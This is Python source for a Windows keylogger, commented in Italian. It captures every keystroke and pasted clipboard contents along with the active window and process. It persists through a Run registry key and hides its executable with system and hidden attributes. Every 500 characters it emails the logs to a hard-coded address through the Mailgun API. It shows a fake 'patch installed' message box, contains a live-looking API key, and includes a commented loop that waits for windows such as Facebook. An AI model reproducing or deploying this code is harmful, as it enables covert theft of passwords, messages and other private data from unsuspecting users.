import ctypes

import pyHook
import os
import sys
import win32gui
import pythoncom
import time
import subprocess
from ctypes import *
import requests
import win32clipboard

logs = str()

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

HOMEPATH = os.getenv('HOMEPATH')


#percorso home dell'utente dove verra' salvato il file di testo
executable_name = os.path.split(sys.argv[0])[1]

# Persistenza, faremo in modo che l'eseguibile si avvii ad ogni avvio di windows
subprocess.call("copy "+executable_name+" %userprofile%\\", shell=True)

# copiamo nel percorso home l'eseguibile
subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v AwesomeStuff /d %userprofile%\\"+executable_name, shell=True)

# aggiungiamo l'esecuzione automatica nel registro di sistema (Valore: Keylog)
subprocess.call("attrib +s +r +h %userprofile%\\"+executable_name, shell=True)


# EMAIL HANDLING#
# possiamo usare mailgun https://documentation.mailgun.com/quickstart.html
MAILGUN_API_KEY = "key-ea7e18d428c40dd3f80cd07090a22969"
MAILGUN_DOMAIN_NAME = "https://api.mailgun.net/v3/sandboxb4b9b83c29084de8987b2ba088d863f6.mailgun.org"
RECIPIENT_EMAIL = "chris99ls.cl@gmail.com"  # email che ricevera' file da keylogger

#################################
#     SEND EMAIL W/ DATA        #
#################################

def send_simple_message(data):
    a = requests.post("https://api.mailgun.net/v3/" + MAILGUN_DOMAIN_NAME + "mailgun.org/messages",
                      auth=("api", MAILGUN_API_KEY),
                      data={"from": "Excited User <mailgun@" + MAILGUN_DOMAIN_NAME + "mailgun.org>",
                            "to": "Master <" + RECIPIENT_EMAIL + ">",
                            "subject": "report keylog from:" + HOMEPATH,
                            "text": str(data)})

    os.remove(HOMEPATH + "\logs.txt")
    return a


#################################
#       GET PROCESS ID          #
#################################
def get_current_process():
    g = open(HOMEPATH + "\logs.txt", "a")  # apertura file log in append mode

    # ottieni gestore per la finestra in primo piano
    hwnd = user32.GetForegroundWindow()

    # cerca ID processo
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # memorizza ID processo corrente
    process_id = "%d" % pid.value

    # ottieni eseguibile
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # ora legi il titolo
    windows_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)

    # se staimo nel processo giusto stampa header
    logs = "[PID: %s - %s - %s ]" % (process_id, executable.value, windows_title.value)
    print ("[PID: %s - %s - %s ]" % (process_id, executable.value, windows_title.value))

    g.write(logs)
    g.close()
    # chiusura handle
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


#################################
#       GET PRESSED KEY         #
#################################


def OnKeyBoardEvent(event):
    # metodo di callback in seguito a pressione di tasto global logs

    global current_window
    g = open(HOMEPATH + "\logs.txt", "a")  # apertura file log in append mode

    # verifica se il target ha cambiato finestra
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # se hanno premuto un carattere standard
    if 32 < event.Ascii < 127:
        logs= chr(event.Ascii)
        print (chr(event.Ascii))

    else:
        # se [Ctrl + V], recupera la clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            logs = "[PASTE] - %s" % (pasted_value)
            print ("[PASTE] - %s" % (pasted_value))
        else:
            logs = "[%s]" % event.Key
            print ("[%s]" % event.Key)

    g.write(logs)
    g.close()

    d = open(HOMEPATH + "\logs.txt", "r")
    data = d.read()
    d.close()
    if len(data) >= 500:
        try:
            s = send_simple_message(str(data))
            print ("[+] Sending email...")
            print (s)

        except:
            print ("[-] Error sending email")
            raise

def main():

    # craezione file di testo
    if not os.path.exists(HOMEPATH + "\logs.txt"):
        f = open(HOMEPATH + "\logs.txt", "w")
        f.close()
    # il file viene creato nella cartella dell'utente e.g C:\Utenti\NomeUtente
    
    hm = pyHook.HookManager()  # creazione HookManager
    hm.KeyDown = OnKeyBoardEvent  # attesa evento tastiera
    hm.HookKeyboard()  # settagio hook
    pythoncom.PumpMessages()  # attesa per eventi windows(messages)

    # falsa message box
    ctypes.windll.user32.MessageBoxW(0, u"patch succesfully installed!", u"Patch", 0)

if __name__ == "__main__":
    main()
    """
    while True:
        # ciclo che attende la visualizzazione di una scheda obiettivo, es: facebook
        #   target = "facebook"  # possiamo cambiare a nostro piacimento
        #   w = win32gui
        #   w_name = w.GetWindowText(w.GetForegroundWindow())

        #    if target in w_name.lower():
        main()  # se invocato, ferma il ciclo while true e va in attesa di eventi tastiera

        #   time.sleep(5)
"""
